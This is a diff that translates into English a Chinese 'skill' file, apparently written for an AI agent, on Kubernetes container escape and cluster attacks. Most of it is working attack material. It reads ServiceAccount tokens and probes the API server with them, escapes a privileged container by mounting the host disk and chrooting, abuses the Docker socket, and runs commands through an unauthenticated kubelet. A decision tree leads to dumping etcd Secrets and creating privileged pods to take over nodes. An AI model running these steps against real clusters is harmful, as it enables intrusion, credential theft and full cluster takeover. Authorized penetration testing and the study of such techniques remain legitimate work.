@@ -1,129 +1,133 @@
 ---
 name: k8s-container-escape
-description: "Kubernetes 容器逃逸与集群攻击。当目标运行在 K8s 环境中、发现 6443/10250/2379 端口、获取到 ServiceAccount Token、或已在容器内时使用。覆盖容器逃逸、Pod 提权、API Server 未授权、etcd 泄露、RBAC 滥用、节点接管。任何涉及 Kubernetes、容器编排、云原生安全的场景都应使用此技能"
+description: "Kubernetes container escape and cluster attacks. Use when the target runs in a K8s environment, when ports 6443/10250/2379 are discovered, when a ServiceAccount token is obtained, or when already inside a container. Covers container escape, pod privilege escalation, API server unauthorized access, etcd leakage, RBAC abuse, and node takeover. Should be used for any scenario involving Kubernetes, container orchestration, or cloud-native security"
+zh-signals: "Kubernetes 容器逃逸与集群攻击，覆盖 Pod 提权、API Server 与 RBAC 滥用。信号:Kubernetes,容器逃逸,RBAC,API Server,etcd"
+when-to-use: >-
+  Use when a target runs in Kubernetes, you have a foothold in a container or ServiceAccount
+  token, or you discover exposed 6443/10250/2379 ports requiring cluster-level attack testing.
 metadata:
-  tags: "k8s,kubernetes,container,escape,pod,rbac,etcd,apiserver,serviceaccount,容器逃逸,云原生,集群攻击"
+  tags: "k8s,kubernetes,container,escape,pod,rbac,etcd,apiserver,serviceaccount,container-escape,cloud-native,cluster-attack"
   category: "cloud"
 ---
 
-# Kubernetes 容器逃逸与集群攻击
+# Kubernetes Container Escape and Cluster Attacks
 
-K8s 集群一旦被突破，攻击面极大——从单个 Pod 可以横向扩展到整个集群的所有节点和服务。
+Once a K8s cluster is breached, the attack surface is enormous — from a single Pod you can spread laterally to every node and service in the cluster.
 
-## ⛔ 深入参考（必读）
+## ⛔ Further Reading (Must Read)
 
-- 容器逃逸详细手法（挂载逃逸/内核漏洞/特权容器/cgroup）→ 读 [references/escape-techniques.md](references/escape-techniques.md)
-- 集群层面攻击（API Server/etcd/RBAC/横向移动）→ 读 [references/cluster-attacks.md](references/cluster-attacks.md)
-- RBAC 权限自检、Pod 内 API 请求、badPods/KubeHound/gitRepo volume → 读 [references/rbac-and-api-abuse.md](references/rbac-and-api-abuse.md)
+- Detailed container escape techniques (mount escape/kernel vulnerability/privileged container/cgroup) → read [references/escape-techniques.md](references/escape-techniques.md)
+- Cluster-level attacks (API Server/etcd/RBAC/lateral movement) → read [references/cluster-attacks.md](references/cluster-attacks.md)
+- RBAC permission self-check, in-pod API requests, badPods/KubeHound/gitRepo volume → read [references/rbac-and-api-abuse.md](references/rbac-and-api-abuse.md)
 
 ---
 
-## Phase 1: 环境识别
+## Phase 1: Environment Identification
 
-### 1.1 确认在容器内
+### 1.1 Confirm you are inside a container
 ```bash
 cat /proc/1/cgroup 2>/dev/null | grep -qi 'docker\|kubepods\|containerd'
 ls /.dockerenv 2>/dev/null || ls /run/secrets/kubernetes.io 2>/dev/null
-hostname    # K8s Pod 名通常含 deployment 名
+hostname    # K8s Pod names usually contain the deployment name
 env | grep -i kube
 ```
 
-### 1.2 K8s 环境信息收集
+### 1.2 K8s environment information gathering
 ```bash
-# ServiceAccount Token（几乎每个 Pod 都有）
+# ServiceAccount token (almost every Pod has one)
 SA_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
 CA_CERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
 NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)
 
-# API Server 地址
+# API Server address
 echo $KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT
 
-# 测试 API 权限
+# Test API permissions
 curl -sk -H "Authorization: Bearer $SA_TOKEN" \
   https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces/$NAMESPACE/pods
 ```
 
-### 1.3 外部端口探测
-| 端口 | 服务 | 攻击面 |
+### 1.3 External port probing
+| Port | Service | Attack surface |
 |------|------|--------|
-| 6443 | API Server | 未授权/Token 利用 |
-| 10250 | Kubelet | 命令执行 |
-| 10255 | Kubelet (只读) | 信息泄露 |
-| 2379 | etcd | 全量数据（含 Secrets） |
-| 8080 | API Server (不安全) | 完全控制 |
+| 6443 | API Server | Unauthorized access/token exploitation |
+| 10250 | Kubelet | Command execution |
+| 10255 | Kubelet (read-only) | Information leakage |
+| 2379 | etcd | Full data dump (including Secrets) |
+| 8080 | API Server (insecure) | Full control |
 
-## Phase 2: 攻击决策树
+## Phase 2: Attack Decision Tree
 
 ```
-当前位置？
-├─ 容器内部
-│   ├─ 特权容器（privileged=true）→ 挂载宿主机 → 逃逸
-│   ├─ 挂载了 hostPath/docker.sock → 逃逸
-│   ├─ 有 SA Token → SelfSubjectRulesReview / can-i → RBAC 权限驱动攻击
-│   ├─ 能 create pods / pods/exec / impersonate → Pod 创建、进入高权限 Pod 或模拟高权限账户
-│   └─ 普通容器 → 内核漏洞/cgroup 逃逸
-├─ 可访问 Kubelet (10250)
-│   └─ 未授权 → 任意 Pod 命令执行
-├─ 可访问 API Server (6443/8080)
-│   ├─ 匿名访问 → 创建特权 Pod
-│   └─ Token → RBAC 权限枚举
-└─ 可访问 etcd (2379)
-    └─ 提取所有 Secrets
-详细命令 → 参考 references
+Current location?
+├─ Inside a container
+│   ├─ Privileged container (privileged=true) → mount the host → escape
+│   ├─ hostPath/docker.sock mounted → escape
+│   ├─ SA token available → SelfSubjectRulesReview / can-i → RBAC-permission-driven attacks
+│   ├─ Can create pods / pods/exec / impersonate → pod creation, entering a high-privilege pod, or impersonating a high-privilege account
+│   └─ Ordinary container → kernel vulnerability/cgroup escape
+├─ Can reach Kubelet (10250)
+│   └─ Unauthorized → arbitrary pod command execution
+├─ Can reach API Server (6443/8080)
+│   ├─ Anonymous access → create a privileged pod
+│   └─ Token → RBAC permission enumeration
+└─ Can reach etcd (2379)
+    └─ Extract all Secrets
+Detailed commands → refer to the references
 ```
 
-## Phase 3: 容器逃逸速查
+## Phase 3: Container Escape Quick Reference
 
-### 特权容器逃逸（最常见）
+### Privileged container escape (most common)
 ```bash
-# 检查是否特权容器
+# Check whether this is a privileged container
 cat /proc/1/status | grep -i cap
-# CapEff: 0000003fffffffff 表示全能力 = 特权容器
+# CapEff: 0000003fffffffff means full capabilities = privileged container
 
-# 方法 1: 挂载宿主机文件系统
+# Method 1: mount the host filesystem
 mkdir -p /tmp/hostroot
 mount /dev/sda1 /tmp/hostroot
 chroot /tmp/hostroot bash
 ```
 
-### Docker Socket 逃逸
+### Docker socket escape
 ```bash
 ls -la /var/run/docker.sock
-# 存在则可创建特权容器挂载宿主机
+# If it exists, a privileged container can be created to mount the host
 curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json
 ```
 
-→ 完整逃逸手法 → [references/escape-techniques.md](references/escape-techniques.md)
+→ Full escape techniques → [references/escape-techniques.md](references/escape-techniques.md)
 
-## Phase 4: Kubelet 未授权
+## Phase 4: Kubelet Unauthorized Access
 
 ```bash
-# 列出所有 Pod
+# List all pods
 curl -sk https://NODE_IP:10250/pods
 
-# 在任意 Pod 中执行命令
+# Execute a command in any pod
 curl -sk https://NODE_IP:10250/run/NAMESPACE/POD/CONTAINER \
   -d "cmd=id"
 ```
 
-## Phase 5: 集群接管
+## Phase 5: Cluster Takeover
 
 ```bash
-# 用 SA Token 检查权限
+# Check permissions with the SA token
 curl -sk -H "Authorization: Bearer $SA_TOKEN" \
   https://API_SERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \
   -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"create","resource":"pods"}}}'
 
-# 能创建 Pod → 创建特权 Pod 挂载节点
+# If pods can be created → create a privileged pod that mounts the node
 ```
 
-→ 详细集群攻击 → [references/cluster-attacks.md](references/cluster-attacks.md)
+→ Detailed cluster attacks → [references/cluster-attacks.md](references/cluster-attacks.md)
 
-## 工具速查
-| 工具 | 用途 |
+## Tool Quick Reference
+| Tool | Purpose |
 |------|------|
-| kubectl | K8s 集群管理 |
-| kubeletctl | Kubelet 利用 |
-| CDK | 容器逃逸自动化 |
-| PEIRATES | K8s 渗透框架 |
-| etcdctl | etcd 数据提取 |
+| kubectl | K8s cluster administration |
+| kubeletctl | Kubelet exploitation |
+| CDK | Container escape automation |
+| PEIRATES | K8s penetration testing framework |
+| etcdctl | etcd data extraction |
